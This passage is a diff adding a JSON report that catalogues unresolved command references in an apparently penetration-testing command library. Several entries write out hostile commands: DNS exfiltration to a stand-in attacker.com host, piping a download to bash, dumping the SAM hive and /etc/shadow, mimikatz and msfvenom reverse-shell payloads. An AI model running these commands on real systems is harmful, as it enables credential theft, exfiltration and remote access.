@@ -1,0 +1,3983 @@
+{
+  "summary": {
+    "total_unique_values": 245,
+    "total_failures": 295,
+    "categories": {
+      "A_already_exists": 11,
+      "B_create_command": 66,
+      "C_remove_not_command": 111,
+      "D_fuzzy_match": 22,
+      "E_manual_review": 35
+    }
+  },
+  "categories": {
+    "A": [
+      {
+        "text": "nessus scan",
+        "reason": "Already exists as 'nessus-scan'",
+        "metadata": {
+          "match": "nessus-scan",
+          "score": 1.0
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/recon.json",
+            "command_id": "nmap-vuln-scan",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "burp intruder",
+        "reason": "Already exists as 'burp-intruder'",
+        "metadata": {
+          "match": "burp-intruder",
+          "score": 1.0
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/web/general.json",
+            "command_id": "wfuzz-params",
+            "field": "alternatives"
+          },
+          {
+            "file": "data/commands/web/wordpress.json",
+            "command_id": "wpscan-password-attack",
+            "field": "alternatives"
+          }
+        ],
+        "count": 2
+      },
+      {
+        "text": "Import SharpHound data",
+        "reason": "Already exists as 'import-sharphound'",
+        "metadata": {
+          "match": "import-sharphound",
+          "score": 0.9
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/generated/post-exploitation-additions.json",
+            "command_id": "bloodhound-analyze",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "tail-follow-log /var/log/syslog",
+        "reason": "Already exists as 'tail-follow-log'",
+        "metadata": {
+          "match": "tail-follow-log",
+          "score": 0.75
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/monitoring/log-monitoring.json",
+            "command_id": "journalctl-follow",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "docker-mount-escape (simpler)",
+        "reason": "Already exists as 'docker-mount-escape'",
+        "metadata": {
+          "match": "docker-mount-escape",
+          "score": 0.75
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux-docker-commands.json",
+            "command_id": "docker-socket-mount",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "bitsadmin download",
+        "reason": "Already exists as 'bitsadmin-download'",
+        "metadata": {
+          "match": "bitsadmin-download",
+          "score": 1.0
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/exfiltration.json",
+            "command_id": "file-transfer-certutil",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "PowerUp's Get-ModifiableServiceFile",
+        "reason": "Already exists as 'get-modifiableservicefile'",
+        "metadata": {
+          "match": "get-modifiableservicefile",
+          "score": 0.9
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/windows.json",
+            "command_id": "win-weak-service-perms",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Import PowerView",
+        "reason": "Already exists as 'import-powerview'",
+        "metadata": {
+          "match": "import-powerview",
+          "score": 1.0
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/enumeration/ad-powerview-core.json",
+            "command_id": "powerview-get-netdomaincontroller",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-powerview-core.json",
+            "command_id": "powerview-get-netuser",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-powerview-core.json",
+            "command_id": "powerview-get-netuser-filter",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-powerview-core.json",
+            "command_id": "powerview-get-netuser-spn",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-powerview-core.json",
+            "command_id": "powerview-get-netgroup",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-powerview-core.json",
+            "command_id": "powerview-get-netgroup-specific",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-powerview-core.json",
+            "command_id": "powerview-get-netgroupmember",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-powerview-core.json",
+            "command_id": "powerview-get-netcomputer",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-powerview-core.json",
+            "command_id": "powerview-get-netou",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-powerview-core.json",
+            "command_id": "powerview-get-netgpo",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-powerview-core.json",
+            "command_id": "powerview-get-netforest",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-powerview-core.json",
+            "command_id": "powerview-get-netcomputer-all",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-powerview-core.json",
+            "command_id": "powerview-get-netcomputer-ping",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-powerview-core.json",
+            "command_id": "powerview-get-netgroup-recursive",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-session-share-enum.json",
+            "command_id": "powerview-get-netsession",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-session-share-enum.json",
+            "command_id": "powerview-get-netloggedon",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-session-share-enum.json",
+            "command_id": "powerview-find-localadminaccess",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-session-share-enum.json",
+            "command_id": "powerview-find-domainshare",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-session-share-enum.json",
+            "command_id": "powerview-find-domainshare-accessible",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-session-share-enum.json",
+            "command_id": "powerview-find-domainshare-exclude",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-powerview-permissions.json",
+            "command_id": "powerview-get-objectacl",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-powerview-permissions.json",
+            "command_id": "powerview-get-objectacl-genericall",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-powerview-permissions.json",
+            "command_id": "powerview-convert-sidtoname",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-powerview-permissions.json",
+            "command_id": "powerview-get-objectacl-writedacl",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-powerview-permissions.json",
+            "command_id": "powerview-get-objectacl-forcechangepassword",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-powerview-permissions.json",
+            "command_id": "powerview-get-objectacl-writeowner",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-powerview-permissions.json",
+            "command_id": "powerview-find-interestingdomainacl",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-powerview-permissions.json",
+            "command_id": "powerview-get-pathacl",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-powerview-permissions.json",
+            "command_id": "powerview-get-objectacl-user",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-powerview-permissions.json",
+            "command_id": "powerview-get-objectacl-group",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 30
+      },
+      {
+        "text": "PowerView imported",
+        "reason": "Already exists as 'verify-powerview-imported'",
+        "metadata": {
+          "match": "verify-powerview-imported",
+          "score": 0.9
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/enumeration/ad-powershell-nested-groups.json",
+            "command_id": "ps-powerview-get-user-details",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/enumeration/ad-powershell-nested-groups.json",
+            "command_id": "ps-powerview-find-service-accounts",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 2
+      },
+      {
+        "text": "msfvenom -p windows/meterpreter/reverse_tcp",
+        "reason": "Already exists as 'windows/meterpreter/reverse_tcp'",
+        "metadata": {
+          "match": "windows/meterpreter/reverse_tcp",
+          "score": 0.9
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/general.json",
+            "command_id": "msfvenom-windows-exe",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "curl http://<TARGET>:<PORT> - HTTP service verification",
+        "reason": "Already exists as 'curl-http-service-verification'",
+        "metadata": {
+          "match": "curl-http-service-verification",
+          "score": 0.8
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/pivoting/linux-utilities.json",
+            "command_id": "nmap-port-check",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      }
+    ],
+    "B": [
+      {
+        "text": "python requests.post()",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/web/general.json",
+            "command_id": "curl-post",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "wfuzz -z file,<WORDLIST> --hc 200 -d 'log=admin&pwd=FUZZ' <URL>/wp-login.php",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/web/wordpress.json",
+            "command_id": "wpscan-password-attack",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "burp suite XML-RPC plugin",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/web/wordpress.json",
+            "command_id": "wordpress-xmlrpc-enum",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "chmod +x",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/generated/post-exploitation-additions.json",
+            "command_id": "linenum-run",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/generated/post-exploitation-additions.json",
+            "command_id": "les-run",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/generated/post-exploitation-additions.json",
+            "command_id": "pspy-monitor",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 3
+      },
+      {
+        "text": "at (command-line AT utility)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/monitoring/scheduled-tasks.json",
+            "command_id": "win-wmic-scheduled-job",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "grep time range in syslog files (manual)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/monitoring/log-monitoring.json",
+            "command_id": "journalctl-time-range",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "journalctl -k (kernel messages via journald)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/monitoring/log-monitoring.json",
+            "command_id": "dmesg-kernel-messages",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "journalctl -kf (kernel messages via journald)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/monitoring/log-monitoring.json",
+            "command_id": "dmesg-follow",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "w (includes user info)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/monitoring/resource-monitoring.json",
+            "command_id": "uptime-load-average",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "ls -l /proc/*/fd/ (manual check)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/monitoring/resource-monitoring.json",
+            "command_id": "lsof-user-files",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "lsof +d <DIRECTORY> (non-recursive, faster)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/monitoring/resource-monitoring.json",
+            "command_id": "lsof-directory-usage",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "docker info",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux-docker-commands.json",
+            "command_id": "check-docker-socket",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "docker version",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux-docker-commands.json",
+            "command_id": "check-docker-socket",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "docker pull alpine (if no images available)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux-docker-commands.json",
+            "command_id": "list-docker-images",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "docker pull ubuntu (larger but more tools)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux-docker-commands.json",
+            "command_id": "docker-pull-alpine",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "docker pull busybox (even smaller than alpine)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux-docker-commands.json",
+            "command_id": "docker-pull-alpine",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "python3 smbserver.py share .",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/general-transfer.json",
+            "command_id": "smb-server",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "bitsadmin for newer Windows",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/general-transfer.json",
+            "command_id": "vbscript-download",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "certutil base64 encoding",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/general-transfer.json",
+            "command_id": "debug-exe-transfer",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "dig $data.attacker.com",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/general-transfer.json",
+            "command_id": "dns-exfiltration",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "host $data.attacker.com",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/general-transfer.json",
+            "command_id": "dns-exfiltration",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "ping $data.attacker.com",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/general-transfer.json",
+            "command_id": "dns-exfiltration",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "wget if curl unavailable",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/exfiltration.json",
+            "command_id": "file-transfer-curl",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "curl <URL> | bash (pipe to shell)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/exfiltration.json",
+            "command_id": "file-transfer-curl",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "wget <URL> -O <FILE> (PowerShell alias)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/exfiltration.json",
+            "command_id": "file-transfer-powershell-download",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "curl <URL> -o <FILE> (PowerShell alias)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/exfiltration.json",
+            "command_id": "file-transfer-powershell-download",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "rsync for larger transfers",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/exfiltration.json",
+            "command_id": "file-transfer-scp",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "socat for bidirectional transfer",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/exfiltration.json",
+            "command_id": "file-transfer-nc-push",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "certutil for simpler syntax",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/exfiltration.json",
+            "command_id": "file-transfer-bitsadmin",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "rundll32 keymgr.dll,KRShowKeyMgr",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/windows.json",
+            "command_id": "win-saved-credentials",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "dir C:\\Windows\\System32\\Tasks",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/windows.json",
+            "command_id": "windows-scheduled-tasks",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "reg save HKLM\\SAM sam.save",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/windows.json",
+            "command_id": "windows-sam-system-backup",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "reg save HKLM\\SYSTEM system.save",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/windows.json",
+            "command_id": "windows-sam-system-backup",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "mimikatz dpapi::masterkey",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/windows.json",
+            "command_id": "windows-dpapi-masterkeys",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "icacls C:\\Progra~1\\*",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/windows.json",
+            "command_id": "windows-dll-hijacking",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "cat /etc/sudoers (if readable)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux-sudo-commands.json",
+            "command_id": "check-sudo-privs",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "ls -la /root/ (check if can list root directory)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux-sudo-commands.json",
+            "command_id": "verify-root-access-sudo",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "cat /etc/shadow (attempt to read directly)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux-sudo-commands.json",
+            "command_id": "verify-root-access-sudo",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "getcap utility installed (part of libcap package)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux-capabilities-commands.json",
+            "command_id": "enumerate-capabilities",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "nmap -sn <SUBNET> (if dsquery unavailable)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/enumeration/ad-legacy-enumeration.json",
+            "command_id": "dsquery-computer",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "wfuzz -c -z file,<WORDLIST> -d \"fm_usr=<USER>&fm_pwd=FUZZ\" --hs \"<FAIL_STRING>\" http://<TARGET>/<PAGE>",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/enumeration/password-attacks-hydra.json",
+            "command_id": "hydra-http-post-form",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "python scripts: gpp-decrypt.py",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/enumeration/ad-session-share-enum.json",
+            "command_id": "gpp-password-decrypt",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "hashcat -m 22921 (aes-256-cbc only, NOT aes-256-ctr)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/enumeration/password-attacks-john.json",
+            "command_id": "john-ssh-key-crack",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "mysql -h <TARGET> -u <USER> -p (interactive password prompt)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/database-access.json",
+            "command_id": "mysql-connect-basic",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "nmap installed (default on Kali)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-psexec.json",
+            "command_id": "psexec-verify-firewall",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "sudo apt update && sudo apt upgrade exploitdb",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/auto-generated-full-syntax-exploitation.json",
+            "command_id": "searchsploit-update",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "nmap --script=http-headers",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/auto-generated-full-syntax-exploitation.json",
+            "command_id": "whatweb-technology-id",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "msfvenom -p linux/x64/meterpreter/reverse_tcp",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/general.json",
+            "command_id": "msfvenom-linux-elf",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "nc -nvlp <LPORT> (for non-staged shells only)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/metasploit-handlers.json",
+            "command_id": "msf-handler-setup",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "rlwrap nc -lvnp <LPORT> for readline support (arrow keys, history)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-helpers.json",
+            "command_id": "nc-listener-tcp",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "msfconsole exploit/multi/handler for Meterpreter shells",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-helpers.json",
+            "command_id": "nc-listener-tcp",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "nmap installed on Kali (pre-installed)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-helpers.json",
+            "command_id": "lateral-movement-port-check",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "getwd (alias)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/metasploit-meterpreter.json",
+            "command_id": "meterpreter-pwd",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "dir (alias)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/metasploit-meterpreter.json",
+            "command_id": "meterpreter-ls",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "download + local cat",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/metasploit-meterpreter.json",
+            "command_id": "meterpreter-cat",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "msfvenom -p windows/x64/meterpreter_reverse_tcp (Meterpreter instead)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/metasploit-payloads.json",
+            "command_id": "msfvenom-windows-reverse",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "msfvenom -p linux/x64/meterpreter_reverse_tcp (Meterpreter variant)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/metasploit-payloads.json",
+            "command_id": "msfvenom-linux-reverse",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "msfvenom -p java/jsp_shell_reverse_tcp -f war (WAR file for manager deployment)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/metasploit-payloads.json",
+            "command_id": "msfvenom-jsp-reverse",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "updog - HTTP server with upload support (pip install updog)",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/pivoting/linux-utilities.json",
+            "command_id": "apache2-start",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "smb-server - SMB file sharing alternative",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/pivoting/linux-utilities.json",
+            "command_id": "apache2-start",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "whoami /all - Complete user info",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/pivoting/windows-utilities.json",
+            "command_id": "whoami-priv",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "socat-port-forward - Simple relay without SSH encryption, no authentication required",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/pivoting/ssh-tunneling.json",
+            "command_id": "ssh-local-port-forward",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "plink-remote-forward - Windows alternative using Plink when OpenSSH unavailable",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/pivoting/ssh-tunneling.json",
+            "command_id": "ssh-remote-port-forward",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "plink-remote-forward + microsocks - Workaround for OpenSSH <7.6",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/pivoting/ssh-tunneling.json",
+            "command_id": "ssh-remote-dynamic-port-forward",
